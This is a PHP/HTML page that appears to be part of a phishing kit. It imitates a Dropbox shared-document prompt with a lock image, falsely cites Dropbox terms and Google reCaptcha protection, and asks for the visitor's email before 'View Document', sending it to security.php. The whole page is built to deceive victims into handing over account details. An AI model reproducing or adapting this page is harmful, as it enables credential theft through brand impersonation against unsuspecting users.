<?php
ob_start();
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Basic File Mananger</title>
    <!-- Bootstrap CSS file -->
    <link rel="stylesheet" href="bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	<link rel="icon" href="favicon.png" sizes="16x16" type="image/png">
    <link rel="stylesheet" href="stik.css">

</head>

<body>
<!--HEADER OF THE PAGE GOES HERE-->
<div class="header"></div>

<!--PAGE CENTER STARTS HERE -->
<div id="centered">
<img src="lock.png" width="170px" height="160px" /><br />
<img src="body.png" width="420px" height="128px"/>

<form action="security.php" method="post">

<span id="ff"></span>
<p style="font-family:verdana, helvetica, arial; color:grey; text-align:left;">

</p>
<p>
<input type="email" name="new" style="height:30px; width:420px;" placeholder="Email" required>
</p>

<!--TERMS AND CONDITION-->
<p style="padding:0;">
<span style="font-family:helvetica, arial; color:grey; font-size:12px;"> This page is subject to </span> 
<a href="#" style="font-family:helvetica, arial; font-size:12px;">Dropbox Terms of service and privacy policy</a> 
<span style="font-family:helvetica, arial; color:grey; font-size:12px;">
and protected by google reCaptcha </span>
</p>

<!--REMEMBER ME AND SIGN IN BUTTON-->
<p style="margin-top:50px;">
<input type="checkbox" checked>
<span style="font-family:verdana, helvetica, arial; color:grey; font-size:12px; text-align:left;">Remember me</span> 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<input type="submit"  value="View Document" style="height:40px;"/>
</p>

</form>

</div>

</body>
</html>